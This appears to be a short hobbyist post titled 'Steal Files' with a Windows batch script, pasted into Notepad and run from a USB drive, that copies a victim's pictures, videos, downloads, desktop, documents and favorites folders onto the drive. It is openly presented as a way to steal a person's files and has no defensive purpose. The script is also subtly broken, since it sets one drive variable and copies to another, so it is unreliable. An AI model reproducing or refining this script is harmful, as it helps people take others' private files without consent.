# Steal Files
plug in a usb drive and start stealing the persons files. do at your own rsik
Usage
1 open notpad 
and copy this


@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
%backupcmd% "%USERPROFILE%\downloads" "%drive%\all\downloads"
%backupcmd% "%USERPROFILE%\desktop" "%drive%\all\desktop"
%backupcmd% "%USERPROFILE%\documents" "%drive%\all\documents"
@echo off
cls


paste this in notpad and save this as a ".bat" file in your USBDrive 
open it to begin copy :)
